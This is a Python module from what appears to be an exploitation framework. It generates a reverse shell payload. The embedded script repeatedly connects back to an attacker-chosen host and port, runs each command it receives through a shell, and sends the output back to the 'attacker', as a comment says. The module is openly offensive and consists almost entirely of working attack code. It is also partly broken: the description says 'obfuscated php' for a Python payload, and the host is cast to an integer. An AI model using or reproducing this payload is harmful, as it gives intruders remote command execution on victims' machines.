'''
Created on Jul 24, 2012

@author: aeon
'''

# must include this
from core.core import payload

class payload(payload):
    """
    The generic payload template
    """
    
    def set_title(self):
        self.title = "Generic python reverse shell payload"
          
    def set_description(self):
        self.description = \
        """
        This payload executes a reverse shell on the affected target using obfuscated php."""    
        
    def get_payload_type(self):
        return "reverse"
    
    def set_author(self):
        self.author = \
        [
            ['aeon','<aeon.s.flux[at]gmail.com>'],    # zro module
        ]
        
    # needs fixing
    def register_options(self):
        self.opt_params["rhost"] = \
        [
            "127.0.0.1", "The remote host to send the shell to" 
        ]
        self.opt_params["rport"] = \
        [
            4444, "The remote host's port to send the shell to" 
        ]
        
    def initialise_payload(self):
        
        rport = int(self.opt_params["rport"][0])
        rhost = int(self.opt_params["rhost"][0])
        
        self.shell = \
        """
import socket
import subprocess
import sys
import time

HOST = '%s'    # The remote host
PORT = %s           # The same port as used by the server



def connect((host, port)):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024)
    if data == "quit\n":
        s.close()
        sys.exit(0)
    # the socket died
    elif len(data)==0:
        return True
    else:
        # do shell command
        proc = subprocess.Popen(data, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # send output to attacker
        s.send(stdout_value)
        return False

def main():
    while True:
        socked_died=False
        try:
            s=connect((HOST,PORT))
            while not socked_died:
                socked_died=wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    sys.exit(main())
        """ % (rhost, rport)
        
        return self.shell
